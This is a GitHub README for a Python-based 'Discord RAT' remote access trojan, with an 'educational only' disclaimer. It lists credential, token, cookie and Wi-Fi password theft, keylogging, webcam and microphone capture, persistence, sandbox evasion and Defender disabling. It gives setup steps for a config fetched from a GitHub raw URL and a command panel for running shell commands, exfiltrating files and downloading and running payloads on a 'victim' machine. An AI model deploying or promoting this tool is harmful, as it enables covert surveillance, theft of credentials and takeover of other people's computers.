


<h1 align="center">🐀 Discord RAT — Remote Access Trojan</h1>

<p align="center">
  <strong>Created by:</strong> <a href="https://github.com/deadconvicess">@deadconvicess</a> •
  <strong>Status:</strong> Development / Educational Only •
  <strong>Language:</strong> Python 3.10+ •
  <strong>Platform:</strong> Windows Only
</p>

---
## ⚠️ Disclaimer
> This software is for **EDUCATIONAL and RESEARCH** purposes only.  
> You are solely responsible for any misuse. The developer does **not condone** illegal access or malicious behavior.
---
![Rat Image](https://github.com/user-attachments/assets/04c23c37-129e-49c3-b2a7-ef1c67f05a47)
![Troll Commands](https://github.com/user-attachments/assets/d177858e-5292-4fff-9ba0-1be4a02deabd)
## 🔥 Features

- ✅ Discord Token Grabber  
- ✅ Spotify OAuth Token & Password Stealer  
- ✅ Webcam Snap & Microphone Recorder  
- ✅ Screen Capture & Full Video Recorder  
- ✅ Keylogger with Live Discord Logging  
- ✅ VM & Sandbox Detection  
- ✅ File Upload + Execution  
- ✅ Chrome/Edge/Brave Password Extractor  
- ✅ Cookie + History Grabber  
- ✅ Wi-Fi Credential Extractor  
- ✅ Startup Persistence (Reg + Schtasks)  
- ✅ Task Manager Blocker / Unlocker  
- ✅ System Info & Geo-IP  
- ✅ Fake Error Popups / TTS Voice  
- ✅ Defender Disabler & System Control  
- ✅ Crash PC / Self Destruct / Memory Flush
---

🗂️ Step 1 — Create a Private GitHub Gist or Repo File
Make a Gist or file in a private repo (e.g., config.txt)

Add:

pgsql
Copy
Edit
LINE 1 = Your Discord Bot Token  
LINE 2 = Your Webhook URL
Click "Raw" on the file and copy the direct URL (e.g. https://raw.githubusercontent.com/youruser/yourrepo/main/config.txt)

🔧 Step 2 — Update Bot Config
In Rat.py, replace this line:

python
Copy
Edit
config_url = "https://pastebin.com/raw/your_id_here"
with:

python
Copy
Edit
config_url = "https://raw.githubusercontent.com/youruser/yourrepo/main/config.txt"
✅ Tip: Use GitHub raw links—they’re fast, direct, and more reliable than Pastebin.

▶️ Step 3 — Run the Bot
Launch from terminal:

bash
Copy
Edit
python Rat.py
📜 COMMAND PANEL
🖥 SYSTEM
Command	Description
.help	Show help menu
.info	Get PC info (username, OS, public IP)
.geo	Grab geolocation data
.ss	Screenshot victim's screen
.record	Record screen for 10 seconds
.webcam	Take webcam snapshot
.restart	Restart victim’s PC
.shutdown	Shutdown victim’s PC
.crash	Kill svchost.exe (force crash or BSOD)

🔧 CONTROL
Command	Description
.key start/stop	Start or stop keylogger
.shell <cmd>	Execute CMD or PowerShell commands
.moff / .mon	Turn off / turn on monitor
.msg <text>	Show error-style popup message
.speak <text>	Speak text out loud (system voice)

📁 FILE SYSTEM
Command	Description
.up	Upload file from victim to Discord channel
.dl <url>	Download and run a file on victim's machine
